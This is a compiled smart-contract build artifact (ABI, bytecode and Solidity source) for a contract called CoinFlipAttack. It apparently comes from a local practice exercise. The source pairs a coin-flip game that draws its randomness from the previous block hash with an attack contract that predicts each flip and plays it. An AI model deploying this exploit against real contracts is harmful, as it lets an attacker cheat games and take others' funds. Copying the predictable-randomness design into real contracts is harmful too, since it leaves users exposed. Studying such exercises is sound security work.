{
  "contractName": "CoinFlipAttack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_victim",
          "type": "address"
        }
      ],
      "name": "attack",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040527f800000000000000000000000000000000000000000000000000000000000000060005534801561003457600080fd5b5061034f806100446000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063d018db3e14610030575b600080fd5b61004a60048036038101906100459190610164565b610060565b60405161005791906101c5565b60405180910390f35b60008082905060006001436100759190610211565b4060001c9050600080548261008a91906101e0565b905060006001821461009d5760006100a0565b60015b90508373ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b81526004016100db91906101c5565b602060405180830381600087803b1580156100f557600080fd5b505af1158015610109573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061012d919061018d565b5080945050505050919050565b600081359050610149816102eb565b92915050565b60008151905061015e81610302565b92915050565b60006020828403121561017657600080fd5b60006101848482850161013a565b91505092915050565b60006020828403121561019f57600080fd5b60006101ad8482850161014f565b91505092915050565b6101bf81610257565b82525050565b60006020820190506101da60008301846101b6565b92915050565b60006101eb82610283565b91506101f683610283565b925082610206576102056102bc565b5b828204905092915050565b600061021c82610283565b915061022783610283565b92508282101561023a5761023961028d565b5b828203905092915050565b600061025082610263565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6102f481610245565b81146102ff57600080fd5b50565b61030b81610257565b811461031657600080fd5b5056fea2646970667358221220fa2189223be3765ecbfdd864e3fe19d5e7fda54ddc6cffa1b6538e070a97b52464736f6c63430008000033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract CoinFlip {\r\n\r\n  uint256 public consecutiveWins;\r\n  uint256 lastHash;\r\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n  address public winner;\r\n\r\n  constructor() {\r\n    consecutiveWins = 0;\r\n  }\r\n\r\n  function flip(bool _guess) public returns (bool) {\r\n    uint256 blockValue = uint256(blockhash(block.number - 1));\r\n\r\n    if (lastHash == blockValue) {\r\n      revert();\r\n    }\r\n\r\n    lastHash = blockValue;\r\n    uint256 coinFlip = blockValue / FACTOR;\r\n    bool side = coinFlip == 1 ? true : false;\r\n\r\n    if (side == _guess) {\r\n      consecutiveWins++;\r\n      winner= msg.sender;\r\n      return true;\r\n    } else {\r\n      consecutiveWins = 0;\r\n      return false;\r\n    }\r\n  }\r\n\r\n  function getWinner()public  view returns (address){\r\n    return winner;\r\n  }\r\n  function getconsecutiveWins()public  view returns (uint256){\r\n    return consecutiveWins;\r\n  }\r\n}\r\ncontract CoinFlipAttack {\r\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n  function attack(address _victim) public returns (bool) {\r\n    CoinFlip coinflip = CoinFlip(_victim);\r\n    uint256 blockValue = uint256(blockhash(block.number - 1));\r\n    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);\r\n    bool side = coinFlip == 1 ? true : false;\r\n    coinflip.flip(side);\r\n    return side;\r\n  }\r\n}\r\n",
  "sourcePath": "D:\\Test\\CoinFlip\\contracts\\phish.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2023-09-08T07:59:19.072Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}